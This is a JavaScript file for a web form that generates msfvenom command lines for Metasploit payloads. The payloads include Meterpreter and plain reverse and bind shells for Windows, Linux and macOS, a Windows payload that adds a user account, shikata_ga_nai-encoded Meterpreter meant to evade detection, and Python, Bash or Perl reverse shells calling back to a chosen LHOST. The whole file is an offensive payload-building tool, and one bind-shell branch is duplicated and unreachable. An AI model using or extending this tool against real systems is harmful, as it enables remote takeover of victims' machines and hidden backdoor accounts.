function updateFormFields() {
    const payload = document.getElementById("payload").value;
    const dynamicFields = document.getElementById("dynamicFields");
    const formatField = document.getElementById("formatSection");  // Get parent element of format
    const filenameField = document.getElementById("fileSection");
    dynamicFields.innerHTML = '';
    if (payload === "Scripting_Reverse_Shell") {
        formatField.style.display = "none";

    } else if (["win/meterp/rev/tcp/shellcode", "lnx/x86/meterp/rev/tcp/shellcode", "osx/x86/rev/tcp/shellcode"].includes(payload)) { filenameField.style.display = "none"; }
    else {
        formatField.style.display = "block";
        filenameField.style.display = "block";
    }

    // If "Create User" payload is selected, ask for username and password
    if (payload === "windows/adduser") {
        dynamicFields.innerHTML = `
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter username" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter password" required>
        `;
    } else if (["osx/x86/shell_bind_tcp", "linux/x86/meterpreter/bind_tcp", "generic/shell_bind_tcp"].includes(payload)) {
        // For Mac Bind Shell (only LHOST to RHOST)
        dynamicFields.innerHTML = `
            <label for="rhost">RHOST:</label>
            <input type="text" id="rhost" name="rhost" placeholder="Enter RHOST" required>

            <label for="lport">LPORT:</label>
            <input type="number" id="lport" name="lport" placeholder="Enter LPORT" required>
        `;
    } else if (["linux/x86/meterpreter/bind_tcp", "generic/shell_bind_tcp"].includes(payload)) {
        // For Bind Shell Payloads (change LHOST to RHOST and LPORT to RPORT)
        dynamicFields.innerHTML = `
            <label for="rhost">RHOST:</label>
            <input type="text" id="rhost" name="rhost" placeholder="Enter RHOST" required>

            <label for="rport">RPORT:</label>
            <input type="number" id="rport" name="rport" placeholder="Enter RPORT" required>
        `;
    } else if (payload === "windows/meterpreter/reverse_tcp_encoded") {
        dynamicFields.innerHTML = `
            <label for="lhost">LHOST:</label>
            <input type="text" id="lhost" name="lhost" placeholder="Enter LHOST" required>
            <label for="lport">LPORT:</label>
            <input type="number" id="lport" name="lport" placeholder="Enter LPORT" required>
            <div>
            <label for="encoder">Encoder:</label>
            <select id="encoder" name="encoder">
              <option value="shikata_ga_nai">shikata_ga_nai</option>
              <option value="x86/countdown">x86/countdown</option>
              <option value="x86/jmp_call_additive">x86/jmp_call_additive</option>
            </select>
            <label for="iterations">Iterations:</label>
            <input type="number" id="iterations" name="iterations" min="1" value="3" required />
            </div>
        `;

    } else if (payload === "Scripting_Reverse_Shell") {
        // For Script Payloads (ask for the script language)
        dynamicFields.innerHTML = `
            <label for="lhost">LHOST:</label>
            <input type="text" id="lhost" name="lhost" placeholder="Enter LHOST" required>

            <label for="lport">LPORT:</label>
            <input type="number" id="lport" name="lport" placeholder="Enter LPORT" required>
            <div><label for="scriptLang">Script Language:</label>
            <select id="scriptLang" name="scriptLang" required>
                <option value="python">Python</option>
                <option value="bash">Bash</option>
                <option value="perl">Perl</option>
            </select></div>
        `;
    } else {
        // Default fields for LHOST and LPORT for most payloads
        dynamicFields.innerHTML = `
            <label for="lhost">LHOST:</label>
            <input type="text" id="lhost" name="lhost" placeholder="Enter LHOST" required>

            <label for="lport">LPORT:</label>
            <input type="number" id="lport" name="lport" placeholder="Enter LPORT" required>
        `;
    }
}

function generateCommand() {
    // Get form values
    var payload = document.getElementById("payload").value;
    var format = document.getElementById("format").value;
    const output = document.getElementById("output").value;
    const dynamicFields = document.getElementById("dynamicFields");
    var run_this = true;

    let command = `msfvenom`;

    // If "Create User" is selected, add username and password
    if (payload === "windows/adduser") {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        if (!username || !password) {
            alert("Please enter both username and password!");
            return;
        }

        command += ` -p ${payload} USER=${username} PASS=${password} -f ${format}`;
    } else if (payload === "osx/x86/shell_bind_tcp") {
        // For Mac Bind Shell, use RHOST and LPORT
        const rhost = document.getElementById("rhost").value;
        const lport = document.getElementById("lport").value;

        if (!rhost || !lport) {
            alert("Please enter both RHOST and LPORT!");
            return;
        }

        command += ` -p ${payload} RHOST=${rhost} LPORT=${lport} -f ${format}`;
    } else if (["linux/x86/meterpreter/bind_tcp", "generic/shell_bind_tcp"].includes(payload)) {
        // For Bind Shell Payloads, use RHOST and RPORT
        const rhost = document.getElementById("rhost").value;
        const rport = document.getElementById("rport").value;

        if (!rhost || !rport) {
            alert("Please enter both RHOST and RPORT!");
            return;
        }

        command += ` -p ${payload} RHOST=${rhost} RPORT=${rport} -f ${format}`;
    } else if (payload === "Scripting_Reverse_Shell") {
        // For Script Payloads, ask for script language
        const scriptLang = document.getElementById("scriptLang").value;
        const lhost = document.getElementById("lhost").value;
        const lport = document.getElementById("lport").value;

        if (!lhost || !lport) {
            alert("Please enter both LHOST and LPORT!");
            return;
        }
        if (!scriptLang) {
            alert("Please select a script language!");
            return;
        }
        else {
            if (scriptLang === "python") {
                payload = "cmd/unix/reverse_python";
                format = "py";
            }
            else if (scriptLang === "bash") {
                payload = "cmd/unix/reverse_bash";
                format = "sh";
            }
            else {
                payload = "cmd/unix/reverse_perl";
                format = "pl";
            }
        }

        command += ` -p ${payload} LHOST=${lhost} LPORT=${lport} -f raw`;
    } else if (["windows/meterpreter/reverse_tcp_encoded"].includes(payload)) {
        const encoder = document.getElementById("encoder").value;
        const iterations = document.getElementById("iterations").value;
        const lhost = document.getElementById("lhost").value;
        const lport = document.getElementById("lport").value;

        if (!lhost || !lport) {
            alert("Please enter both LHOST and LPORT!");
            return;
        }
        if (!iterations || !encoder) {
            alert("Please select both encoder and iterations!");
            return;
        }
        payload = "windows/meterpreter/reverse_tcp";
        command += ` -p ${payload} -e ${encoder} -i ${iterations} LHOST=${lhost} LPORT=${lport} -f ${format}`;
    } else if (["win/meterp/rev/tcp/shellcode", "lnx/x86/meterp/rev/tcp/shellcode", "osx/x86/rev/tcp/shellcode"].includes(payload)) {
        run_this = false;
        const lhost = document.getElementById("lhost").value;
        const lport = document.getElementById("lport").value;

        if (!lhost || !lport) {
            alert("Please enter both LHOST and LPORT!");
            return;
        }
        if (payload === "win/meterp/rev/tcp/shellcode") {
            payload = "windows/meterpreter/reverse_tcp";

        }
        else if (payload === "lnx/x86/meterp/rev/tcp/shellcode") {
            payload = "linux/x86/meterpreter/reverse_tcp";
        }
        else {
            payload = "osx/x86/shell_reverse_tcp";
        }
        command += ` -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format}`;

    }

    else {
        // Default fields for LHOST and LPORT for most payloads
        const lhost = document.getElementById("lhost").value;
        const lport = document.getElementById("lport").value;

        if (!lhost || !lport) {
            alert("Please enter both LHOST and LPORT!");
            return;
        }

        command += ` -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format}`;
    }

    if (run_this) {
        command += `  -o ${output}.${format}`;
    }
    console.log(command)

    // Output the generated command
    document.getElementById("generatedCommand").value = command;
}
